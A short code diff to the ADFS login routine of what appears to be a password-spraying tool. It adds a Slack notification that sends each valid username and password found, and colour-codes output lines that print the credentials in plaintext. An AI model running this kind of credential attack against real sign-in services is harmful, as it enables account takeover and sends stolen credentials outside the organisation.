@@ -68,14 +68,15 @@ def adfs_authenticate(url, username, password, useragent, pluginargs):
         data_response['code'] = resp.status_code
 
         if resp.status_code == 302:
+            utils.slacknotify(username, password)
             data_response['success'] = True
-            data_response['output'] = 'SUCCESS_MESSAGE: => {}:{}'.format(
-                username, password)
+            data_response['output'] = utils.prGreen('SUCCESS_MESSAGE: => {}:{}'.format(
+                username, password))
 
         else:  # fail
             data_response['success'] = False
-            data_response['output'] = 'FAILURE_MESSAGE: {} => {}:{}'.format(
-                resp.status_code, username, password)
+            data_response['output'] = utils.prRed('FAILURE_MESSAGE: {} => {}:{}'.format(
+                resp.status_code, username, password))
 
     except Exception as ex:
         data_response['error'] = True
